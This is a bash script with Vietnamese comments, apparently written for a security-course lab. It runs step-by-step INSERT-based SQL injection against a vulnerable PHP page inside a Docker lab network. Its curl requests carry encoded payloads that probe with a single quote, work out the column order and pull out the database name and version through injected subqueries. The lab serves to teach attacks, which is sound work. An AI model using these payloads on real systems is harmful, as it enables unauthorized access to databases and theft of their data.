#!/bin/bash
# Kich ban Vi du 2 (Lab 05): Kiem thu lo hong INSERT SQL Injection (sqli2.php)
# Thuc hien cac buoc theo muc 5.2.2 trong Lab05_HD.pdf

set -u

CONTAINER_ATTACKER="lab05_attacker"
IP_WEB="10.2.6.80"
POST_URL="http://${IP_WEB}/sqli/sqli2.php"

note() { printf '\n===== %s =====\n' "$1"; }

note "[Buoc 1, 2, 3] Gui du lieu POST them san pham binh thuong"
echo "POST: cat=keyboard, vendor=Logitech, model=K120, price=10"
sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=Logitech&model=K120&price=10" \
  "$POST_URL" | grep -A 5 "Logitech"

note "[Buoc 5 & 6] Tham do ki tu dau nhay don tren truong vendor"
echo "POST: vendor=anyVendor'"
sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=anyVendor%27&model=Test&price=5" \
  "$POST_URL" | grep -i "error" || echo "[-] Server bao loi cu phap SQL hoac khong the them ban ghi"

note "[Buoc 7 & 8] Xac dinh thu tu cot va them thanh cong ban ghi voi dau chu thich (#)"
echo "POST: vendor=anyVendor', '1', '2', '3');#"
sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=anyVendor%27%2C+%271%27%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0" \
  "$POST_URL" | grep -A 5 "anyVendor"

note "[Buoc 9] Khai thac do tham ten co so du lieu bang ham database()"
echo "POST: vendor=anyVendor', database(), '2', '3');#"
sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=anyVendor%27%2C+database%28%29%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0" \
  "$POST_URL" | grep -A 5 "webvul"

note "[Buoc 10] Khai thac truy van con (Subquery) de lay phien ban CSDL"
echo "POST: vendor=anyVendor', (select version()), '2', '3');#"
sudo docker exec "$CONTAINER_ATTACKER" curl -s -X POST \
  -d "cat=keyboard&vendor=anyVendor%27%2C+%28select+version%28%29%29%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0" \
  "$POST_URL" | grep -A 5 "anyVendor"

echo -e "\n[✓] HOAN THANH VI DU 2 (INSERT SQL INJECTION)!"
